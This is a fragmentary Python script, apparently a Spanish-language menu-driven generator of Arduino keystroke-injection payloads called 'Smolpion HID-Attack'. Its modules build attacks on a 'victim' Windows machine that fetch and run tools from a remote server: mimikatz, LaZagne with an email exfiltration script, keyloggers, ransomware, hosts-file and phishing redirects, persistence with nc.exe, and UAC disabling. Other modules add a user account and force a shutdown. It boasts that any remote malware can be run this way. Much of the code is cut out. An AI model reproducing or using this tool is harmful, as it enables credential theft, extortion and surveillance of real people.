...
""")
eleccion = int(eval(input("\033[4;32mSmolpion@HID-Attack >> ")))
...
""")
  import re 
  print()
  servidor = input("\x1b[0;1;36mINGRESA LA URL DE TU SERVIDOR REMOTO: >> ")
  servidor_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
...
\033[0;1;32mCOMPILA EL SIGUIENTE CODIGO EN TU DISPOSITIVO SMOLPION CON EL IDE DE ARDUINO.\033[0;1;37m
  ...
  void setup()
  {
    ...
    Keyboard.print("shutdown /s /t""", end=' ')
  print((tiempo), end=' ')
  print("""");""")
...
NADA EN EL EQUIPO VICTIMA Y NO SE DEBERÁ LIDIAR CON TÉCNICAS DE EVASIÓN DE MALWARE.
  ...
  import re    
  print() 
  remote_serv = input("\x1b[1;36mIngresa la ruta del archivo .ps1 (Ej: http://server.com/tar/mimikatz.ps1>>")
  reemply = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
...
#__________________________________________________________________
  arch_php = input("\x1b[1;36mIngresa la ruta del archivo .php (Ej: http://server.com/tar/captura.php)>>")
  reemplyz = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
...
#_____________________________________________________________
  ...
  import re
  print() 
  user_name = input("\x1b[1;36mINGRESA EL NOMBRE DE USUARIO>> ")
  reemplx = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  ...
  user_pass = input("\x1b[1;36mINGRESA LA CONTRASEÑA QUE DESEAS ASIGNAR>> ")
  reemplxa = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
...
LAZAGNE SE ENCARGARÁ DE EXTRAER LAS CONTRASEÑAS DE LOS SIGUIENTES SERVICIOS:
  ...
  import re
  print() 
  laza = input("\x1b[1;36mINGRESA LA RUTA DE lazagne.exe: >> ")
  laza_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  ...
  arch_exec = input("\x1b[1;36mINGRESA LA RUTA DE exec.ps1: >> ")
  exec_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  ...
  mail = input("\x1b[1;36mINGRESA LA RUTA DE power_mail.ps1: >> ")
  mail_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
...
\x1b[1;33m** EL USUARIO PUEDE SERVIRSE DE ESTE MISMO MÓDULO PARA EJECUTAR CUALQUIER MALWARE REMOTO **
  ...
  print()
  import re
  six_serv = input ("\x1b[1;36mINGRESA LA RUTA DE TU KEYLOGGER:>> ")
  six_serv_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  ...
  six_name = input ("\x1b[1;36mINGRESA EL NOMBRE DE TU KEYLOGGER:>> ")
  six_name_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
...
\x1b[0;1;37m5.- CREA UN ARCHIVO PHP, GUARDALO CON EL NOMBRE write.php Y SUBELO A TU SERVIDOR REMOTO 
  ...
  print()
  import re
  seven_serv = input("\x1b[1;36mINGRESA LA RUTA DE TU RANSOMWARE:>> ")
  ...
  seven_name = input ("\x1b[1;36mINGRESA EL NOMBRE DE TU RANSOMWARE:>> ")
...
2)PHISHING""")
  subelection = int(eval(input("\033[4;32m-------------------->> ")))
  if subelection == 1:
    print("""
...
LOS ERRORES DE CERTIFICADO ** """)
    print()
    import re
    oct_serv = input("\x1b[1;36mINGRESA LA RUTA DE TU ARCHIVO HOSTS:>> ")
    oct_serv_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
    ...
    oct_page = input ("\x1b[1;36mINGRESA LA URL DEL OBJETIVO (sin http):>> ")
    print()
...
\x1b[1;33m** PERO EL USUARIO PUEDE MODIFICAR EL CÒDIGO PARA OTROS NAVEGADORES ** """)
    print()
    import re
    ten_serv = input("\x1b[1;36mINGRESA TU SITIO DE PHISHING:>> ")
    ten_serv_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
    ...
    ten_real = input("\x1b[1;36mINGRESA LA URL DEL SITIO REAL:>> ")
    ten_real_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
...
\x1b[0;1;37m____________________________ """)
  ...
  print()
  import re 
  ejec = input("\x1b[1;36mINGRESA LA RUTA DE ejecutor.vbs: >> ")
  ejec_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  ...
  persi = input("\x1b[1;36mINGRESA LA RUTA DE persist.bat: >> ")
  persi_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  ...
  orde = input("\x1b[1;36mINGRESA LA RUTA DE orden.bat: >> ")
  orde_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  ...
  desuac = input("\x1b[1;36mINGRESA LA RUTA DE des_uac.bat: >> ")
  desuac_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  ...
  nc = input("\x1b[1;36mINGRESA LA RUTA DE nc.exe: >> ")
  nc_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
...
LO HARIAS Y ESTE SCRIPT TE LAS DEVOLVERÁ LISTAS PARA SU COMPILACIÓN""")
  ...
  print()
  import re  
  cadena = input("\033[0;1;32mINGRESA TU STRING:'‘>> ")  
  reemplazo = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","|" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, list(reemplazo.keys()))))  
  nueva_cadena = regex.sub(lambda x: str(reemplazo[x.string[x.start() :x.end()]]), cadena) 
  print() 
  print()
  print("""\033[0;1;37m:""", end=' ') 
  print(nueva_cadena)
